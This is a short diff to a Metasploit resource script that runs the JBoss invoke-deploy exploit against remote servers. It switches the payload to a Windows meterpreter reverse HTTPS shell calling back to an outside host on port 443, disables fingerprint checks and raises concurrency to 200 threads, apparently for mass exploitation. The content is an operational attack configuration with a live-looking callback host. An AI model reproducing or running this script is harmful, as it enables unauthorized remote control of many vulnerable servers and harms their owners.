@@ -1,25 +1,19 @@
 use exploit/multi/http/jboss_invoke_deploy
 set TARGET 2
-set PAYLOAD windows/meterpreter/reverse_http
+set PAYLOAD windows/meterpreter/reverse_https
 set LHOST ausecd.ax.lt
 set DisablePayloadHandler true
 set FingerprintCheck false
-set LPORT 10000
+set LPORT 443
 set RPORT 443
 set SSL true
 
 <ruby>
 
-maxjobs = 25
-
-if (framework.datastore['VERBOSE'] == "true")
-	verbose = 1
-else
-	verbose = 0
-end
+maxjobs = 50
 
 if (framework.datastore['THREADS'] == nil)
-	run_single("setg THREADS 25")
+	run_single("setg THREADS 200")
 end
 
 def jobwaiting(maxjobs,verbose)	#thread handling for poor guys
